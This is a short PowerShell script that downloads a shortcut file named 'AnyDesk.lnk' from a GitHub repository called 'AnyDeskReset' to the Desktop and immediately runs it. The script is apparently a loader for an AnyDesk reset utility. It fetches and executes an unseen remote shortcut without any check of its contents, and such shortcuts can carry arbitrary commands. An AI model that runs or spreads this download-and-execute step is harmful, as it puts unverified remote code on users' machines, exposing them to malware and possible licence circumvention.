$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$desktop = [Environment]::GetFolderPath('Desktop')
$lnkPath = Join-Path $desktop 'AnyDesk.lnk'

if (-not (Test-Path $lnkPath)) {
    $url = 'https://github.com/wevertonmbrtx/AnyDeskReset/raw/refs/heads/main/AnyDesk.lnk'
    (New-Object Net.WebClient).DownloadFile($url, $lnkPath)
}

Start-Process -FilePath $lnkPath
